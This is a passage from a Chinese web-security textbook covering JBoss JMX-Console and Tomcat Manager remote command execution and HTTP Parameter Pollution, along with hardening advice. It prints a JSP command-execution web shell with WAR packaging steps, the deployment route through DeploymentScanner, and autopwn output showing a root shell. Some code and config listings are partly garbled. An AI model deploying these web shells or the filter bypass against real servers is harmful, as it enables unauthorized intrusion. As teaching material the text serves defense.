15.3 jBoss远程命令执行jBoss是J2EE环境中一个流行的Web容器，但是jBoss在默认安装时提供的一些功能却不太安全，如果配置不得当，则可能直接造成远程命令执行。由于jBoss在默认安装时会有一个管理后台，叫做JMX-Console，它提供给管理员一些强大的功能，其中包括配置MBeans，这同样也会为黑客们打开方便之门。通过8080端口（默认安装时会监听8080端口）访问/jmx-console能够进入到这个管理界面。默认安装时访问JMX-Console是没有任何认证的。JMX-Console页面在JMX-Console中，有多种可以远程执行命令的方法。最简单的方式，是通过DeploymentScanner远程加载一个war包。默认的DeploymentScanner将检查URL是否是file:/[JBOSSHOME]/server/default/de-ploy/，但通过addURL()方法却可以添加一个远程的war包。这个过程大致如下：首先创建一个合法的war包，除了可执行的shell外，还需要带上相应的meta data。$ echo  'The JSP to execute the commands'$ cat >cmd.jspCommands with JSP");        Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));        OutputStream os = p.getOutputStream();        InputStream in = p.getInputStream();        DataInputStream dis = new DataInputStream(in);        String disr = dis.readLine();        while ( disr != null ) {                out.println(disr);                disr = dis.readLine();                }        }%>$ echo 'The web.xml file in the WEB-INF directory configures the web application'$ mkdir WEB-INF$ cat >WEB-INF/web.xml            Command        /cmd.jsp    $ echo 'Now put it into the WAR file'$ jar cvf cmd.war WEB-INF cmd.jsp$ echo 'Copy it on a web server where the Jboss server can get it'$ cp cmd.war /var/www/localhost/htdocs/然后使用DeploymentScanner，访问http://[host]:8080/jmx-console/HtmlAdaptor?action=inspect MBean&name=jboss.deploy-ment:type=DeploymentScanner,flavor=URL。接下来调用addURL()。如果执行成功，则将返回succsess的信息。当DeploymentScanner下次执行时，应用将布署成功，这个过程一般用一分钟左右。在一分钟后，攻击者的webshell被布署成功。除了使用DelpymentScanner远程布署war包外，德国的Redteam安全小组研究发现，通过JMX-Console提供的BSH（Bean Shell）Deploy-ment方法，同样也能布署war包。BSH能够执行一次性的脚本，或者创建服务，这对于黑客来说很有用。执行命令的思路是，利用createScriptDeploy-ment()执行命令，通常是在/tmp目录下写入一个war包后，再通过JMX-Console的布署功能加载此war包。这个执行过程在此不再赘述。JMX-Console为黑客大开方便之门，通过简单的“Google hacking”，可以在互联网上找到很多开放了JMX-Console的网站，其中大多数是存在漏洞的。通过“Google hacking”搜索存在jBoss管理后台的网站因此出于安全防御的目的，在加固时，需要删除JMX-Console后台，事实上，jBoss的使用完全可以不依赖于它。要移除JMX-Console，只需要删除jmx-console.war和web-console.war即可，它们分别位于$JBOSS_HOME/server/all/deploy和$JBOSS_HOME/server/default/deploy目录下。使用如下命令删除：cd $JBOSS_HOMEbin/shutdown.shmv ./server/all/deploy/jmx-console.war jmx-console-all.bakmv ./server/default/deploy/jmx-console.war jmx-console.war-default-bakmv ./server/all/deploy/management/console-mgr.sar/web-console.warweb-console-all.bakmv ./server/default/deploy/management/console-mgr.sar/web-console.warweb-console-default.bakbin/run.sh如果出于业务需要不得不使用JMX-Console，则应该使用一个强壮的密码，并且运行JMX-Con-sole的端口不应该面向整个Internet开放。
15.4 Tomcat远程命令执行Apache Tomcat与jBoss一样，默认也会运行在8080端口。它提供的Tomcat Manager的作用与JMX-Console类似，管理员也可以在Tomcat Man-ager中部署war包。Tomcat Manager界面但值得庆幸的是，Tomcat Manager布署war包需要有manager权限，而这一权限是在配置文件中定义的。一个典型的配置文件如下：[root@nitrogen conf]# cat tomcat-users.xml[root@nitrogen conf]#需要由管理员修改此文件，定义出manager角色：但是，像下面这种配置，就存在安全隐患了。[root@nitrogen conf]# cat tomcat-users.xml [root@nitrogen conf]#它直接将tomcat用户添加为manager角色，而tomcat用户的密码很可能是一个默认密码，这种配置违背了“最小权限原则”。在Tomcat后台可以直接上传war包：Tomcat管理后台上传war包处当然也可以通过脚本自动化实现这一切。[root@attacker jboss-autopwn-new]# ./tomcat-autopwn-nix 192.168.1.2 80802>/dev/null[x] Web shell enabled!!: http://192.168.1.2:8080/browser/browser.jsp[x] Running as user...:uid=0(root) gid=0(root)groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),6(disk),10(wheel)^C[root@attacker jboss-autopwn-new]#虽然Tomcat后台有密码认证，但笔者仍然强烈建议删除这一后台，因为攻击者可以通过暴力破解等方式获取后台的访问权限，从安全的角度看，这增加了系统的攻击面，得不偿失。
15.5 HTTP Parameter Pollution在2009年的OWASP大会上，Luca、Caret-toni等人演示了这种被称为HPP的攻击。简单来说，就是通过GET或POST向服务器发起请求时，提交两个相同的参数，那么服务器会如何选择呢？比如提交：/?a=test&a=test1在某些服务端环境中，会只取第一个参数；而在另外一些环境中，比如.net环境中，则会变成：a=test,test1这种特性在绕过一些服务器端的逻辑判断时，会非常有用。这种HPP攻击，与Web服务器环境、服务器端使用的脚本语言有关。HPP本身可以看做服务器端软件的一种功能，参数选择的顺序是由服务器端软件所决定的。但是正如我们在本书中所举的很多例子一样，当程序员不熟悉软件的这种功能时，就有可能造成误用，或者程序逻辑涵盖范围不够全面，从而形成漏洞。比如可以通过HPP混淆参数，从而绕过Mod-Security对于SQL注入的检测。HPP的发现者，在测试了大量服务器软件版本的组合后，整理出下表，作为参考。HPP这一问题再次提醒我们，设计安全方案必须要熟悉Web技术方方面面的细节，才不至于有所疏漏。从防范上来看，由于HPP是服务器软件的一种功能，所以只需在具体的环境中注意服务器环境的参数取值顺序即可。